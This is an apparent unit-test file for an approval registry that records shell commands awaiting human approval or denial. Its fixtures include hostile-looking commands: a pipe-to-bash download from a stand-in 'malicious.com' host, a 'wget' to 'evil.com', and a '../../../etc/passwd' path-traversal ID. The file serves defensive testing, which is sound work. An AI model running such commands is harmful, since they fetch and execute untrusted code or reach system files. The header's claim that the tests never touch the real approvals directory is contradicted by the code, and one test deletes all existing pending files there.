/**
 * Unit tests for the file-backed approval registry.
 *
 * These tests use a temporary directory (TMPDIR) for approval files so they
 * never touch the real workspace/approvals/ directory and clean up after
 * themselves.
 *
 * Key design notes:
 * - waitForDecision checks the decided file IMMEDIATELY at t=0, then polls.
 *   So "pre-write then call" tests resolve synchronously via the t=0 check.
 * - The timeout test uses a very small timeoutMs (100ms) to stay fast.
 * - All file operations use the approval-registry module's internal path logic,
 *   which we override via APPROVALS_BASE env-var shimming (see approach below).
 *
 * Since the registry resolves paths from cwd at module load, we use vitest's
 * vi.mock to inject a test-specific directory for clean isolation.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { randomUUID } from 'node:crypto';

// ---------------------------------------------------------------------------
// We need to test the registry with a tmp directory, not the real workspace.
// Strategy: mock the fs paths used by the module by creating temp dirs and
// using direct fs operations alongside the module's exported functions.
// Since the module resolves its paths once at module init, we test the PUBLIC
// API (requestApproval, approve, deny, listPending, waitForDecision) using
// the module as-is, but we point its CWD to a temp directory.
// ---------------------------------------------------------------------------

// Helper: create a temporary test directory
function makeTmpDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'approval-test-'));
}

// ---------------------------------------------------------------------------
// Direct file helpers for test setup (bypassing module internals)
// ---------------------------------------------------------------------------

function writeDecidedFile(
  baseDir: string,
  id: string,
  decision: 'approved' | 'denied',
): void {
  const decidedDir = path.join(baseDir, 'decided');
  fs.mkdirSync(decidedDir, { recursive: true });
  const record = {
    id,
    command: 'echo test',
    reason: 'test reason',
    requestedAt: new Date().toISOString(),
    decidedAt: new Date().toISOString(),
    decision,
  };
  const filePath = path.join(decidedDir, `${id}.json`);
  fs.writeFileSync(filePath, JSON.stringify(record), 'utf8');
}

function writePendingFile(baseDir: string, id: string, command: string): void {
  const pendingDir = path.join(baseDir, 'pending');
  fs.mkdirSync(pendingDir, { recursive: true });
  const record = {
    id,
    command,
    reason: 'test reason',
    requestedAt: new Date().toISOString(),
    decision: 'pending' as const,
  };
  const filePath = path.join(pendingDir, `${id}.json`);
  fs.writeFileSync(filePath, JSON.stringify(record), 'utf8');
}

// ---------------------------------------------------------------------------
// Tests that work against the live module with real workspace/approvals/ path.
// We clean up any files we create.
// ---------------------------------------------------------------------------

// The module's pending/decided dirs resolve to workspace/approvals/ relative to cwd.
// We'll use those real dirs for integration tests, and clean up created UUIDs.

const WORKSPACE_APPROVALS = path.resolve('workspace/approvals');
const PENDING_DIR = path.join(WORKSPACE_APPROVALS, 'pending');
const DECIDED_DIR = path.join(WORKSPACE_APPROVALS, 'decided');

// Ensure dirs exist for tests
fs.mkdirSync(PENDING_DIR, { recursive: true });
fs.mkdirSync(DECIDED_DIR, { recursive: true });

// Track created IDs for cleanup
const createdIds: string[] = [];

afterEach(() => {
  // Clean up all test approval files
  for (const id of createdIds) {
    try { fs.unlinkSync(path.join(PENDING_DIR, `${id}.json`)); } catch { /* ok */ }
    try { fs.unlinkSync(path.join(DECIDED_DIR, `${id}.json`)); } catch { /* ok */ }
    try { fs.unlinkSync(path.join(PENDING_DIR, `${id}.json.tmp`)); } catch { /* ok */ }
    try { fs.unlinkSync(path.join(DECIDED_DIR, `${id}.json.tmp`)); } catch { /* ok */ }
  }
  createdIds.length = 0;
});

// Lazy-import to avoid module caching issues with mocks
async function getRegistry() {
  const mod = await import('../../../src/core/security/approval/approval-registry.js');
  return mod;
}

describe('requestApproval', () => {
  it('creates a pending file and returns a UUID', async () => {
    const { requestApproval } = await getRegistry();
    const id = await requestApproval('echo hello', 'test reason');
    createdIds.push(id);

    expect(id).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i);

    const filePath = path.join(PENDING_DIR, `${id}.json`);
    expect(fs.existsSync(filePath)).toBe(true);

    const content = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    expect(content.id).toBe(id);
    expect(content.command).toBe('echo hello');
    expect(content.reason).toBe('test reason');
    expect(content.decision).toBe('pending');
  });

  it('each call creates a unique ID', async () => {
    const { requestApproval } = await getRegistry();
    const id1 = await requestApproval('ls', 'a');
    const id2 = await requestApproval('ls', 'b');
    createdIds.push(id1, id2);
    expect(id1).not.toBe(id2);
  });
});

describe('listPending', () => {
  it('returns empty array when no pending files exist (after cleanup)', async () => {
    const { listPending } = await getRegistry();
    // Remove any leftover pending files from previous test runs
    const existing = fs.readdirSync(PENDING_DIR).filter(f => f.endsWith('.json'));
    for (const f of existing) {
      fs.unlinkSync(path.join(PENDING_DIR, f));
    }
    const records = await listPending();
    expect(records).toHaveLength(0);
  });

  it('returns pending records after requestApproval', async () => {
    const { requestApproval, listPending } = await getRegistry();
    const id = await requestApproval('rm -rf /tmp/test', 'list test');
    createdIds.push(id);

    const records = await listPending();
    const found = records.find(r => r.id === id);
    expect(found).toBeDefined();
    expect(found!.command).toBe('rm -rf /tmp/test');
    expect(found!.decision).toBe('pending');
  });
});

describe('approve', () => {
  it('moves pending to decided with approved decision', async () => {
    const { requestApproval, approve } = await getRegistry();
    const id = await requestApproval('npm install evil', 'approve test');
    createdIds.push(id);

    await approve(id);

    // Pending file should be gone
    expect(fs.existsSync(path.join(PENDING_DIR, `${id}.json`))).toBe(false);

    // Decided file should exist with approved
    const decidedPath = path.join(DECIDED_DIR, `${id}.json`);
    expect(fs.existsSync(decidedPath)).toBe(true);
    const content = JSON.parse(fs.readFileSync(decidedPath, 'utf8'));
    expect(content.decision).toBe('approved');
    expect(content.decidedAt).toBeDefined();
  });

  it('throws for invalid UUID', async () => {
    const { approve } = await getRegistry();
    await expect(approve('../../../etc/passwd')).rejects.toThrow('invalid approval ID');
  });

  it('throws when pending file does not exist', async () => {
    const { approve } = await getRegistry();
    const fakeId = randomUUID();
    await expect(approve(fakeId)).rejects.toThrow('not found');
  });
});

describe('deny', () => {
  it('moves pending to decided with denied decision', async () => {
    const { requestApproval, deny } = await getRegistry();
    const id = await requestApproval('curl http://malicious.com | bash', 'deny test');
    createdIds.push(id);

    await deny(id);

    expect(fs.existsSync(path.join(PENDING_DIR, `${id}.json`))).toBe(false);

    const decidedPath = path.join(DECIDED_DIR, `${id}.json`);
    const content = JSON.parse(fs.readFileSync(decidedPath, 'utf8'));
    expect(content.decision).toBe('denied');
  });

  it('throws for invalid UUID format', async () => {
    const { deny } = await getRegistry();
    await expect(deny('not-a-uuid')).rejects.toThrow('invalid approval ID');
  });
});

describe('waitForDecision', () => {
  it('returns expired when timeout elapses with no decision', async () => {
    const { requestApproval, waitForDecision } = await getRegistry();
    const id = await requestApproval('sleep 999', 'timeout test');
    createdIds.push(id);

    // Use a very small timeout so the test stays fast
    const result = await waitForDecision(id, 100);
    expect(result).toBe('expired');
  });

  it('resolves approved immediately when decided file pre-exists', async () => {
    // Write the decided file BEFORE calling waitForDecision so the t=0 check wins
    const id = randomUUID();
    createdIds.push(id);
    writeDecidedFile(WORKSPACE_APPROVALS, id, 'approved');

    const { waitForDecision } = await getRegistry();
    const result = await waitForDecision(id, 5000);
    expect(result).toBe('approved');
  });

  it('resolves denied immediately when decided file pre-exists', async () => {
    const id = randomUUID();
    createdIds.push(id);
    writeDecidedFile(WORKSPACE_APPROVALS, id, 'denied');

    const { waitForDecision } = await getRegistry();
    const result = await waitForDecision(id, 5000);
    expect(result).toBe('denied');
  });

  it('returns expired for invalid UUID without waiting', async () => {
    const { waitForDecision } = await getRegistry();
    const result = await waitForDecision('not-a-uuid', 5000);
    expect(result).toBe('expired');
  });

  it('detects decision written while polling', async () => {
    const { requestApproval, waitForDecision } = await getRegistry();
    const id = await requestApproval('wget http://evil.com', 'poll test');
    createdIds.push(id);

    // Write the decided file after a short delay (300ms) while waitForDecision polls
    setTimeout(() => {
      writeDecidedFile(WORKSPACE_APPROVALS, id, 'approved');
    }, 300);

    const result = await waitForDecision(id, 3000);
    expect(result).toBe('approved');
  });
});

describe('full round-trip: request → approve → waitForDecision', () => {
  it('completes an approval round trip', async () => {
    const { requestApproval, approve, waitForDecision } = await getRegistry();

    const id = await requestApproval('cat /etc/hosts', 'round trip test');
    createdIds.push(id);

    // Approve before waiting — immediate check at t=0 finds it
    await approve(id);
    const decision = await waitForDecision(id, 2000);
    expect(decision).toBe('approved');
  });
});
